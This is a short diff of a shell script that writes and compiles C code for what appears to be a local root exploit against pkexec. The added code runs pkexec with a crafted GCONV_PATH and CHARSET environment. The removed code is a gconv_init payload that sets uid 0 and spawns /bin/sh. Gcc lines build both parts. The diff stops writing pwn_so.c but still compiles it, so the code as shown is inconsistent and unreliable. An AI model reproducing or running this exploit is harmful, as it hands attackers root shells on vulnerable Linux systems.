@@ -1,12 +1,16 @@
-cat << 'EOF' > pwn_so.c
+cat << 'EOF' > pwn.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-void gconv() {}
-void gconv_init() {
-    setuid(0); setgid(0);
-    setenv("PATH", ".", 1);
-    execl("/bin/sh", "sh", NULL);
+int main(int argc, char **argv) {
+    char *p[] = { NULL };
+    char *envp[] = { "pwn.so", "PATH=GCONV_PATH=.", "CHARSET=PWN", "SHELL=pwn", NULL };
+    execve("/usr/bin/pkexec", p, envp);
+    return 0;
 }
 EOF
+
+
+gcc -shared -fPIC pwn_so.c -o pwn.so
+gcc -o pwn pwn.c
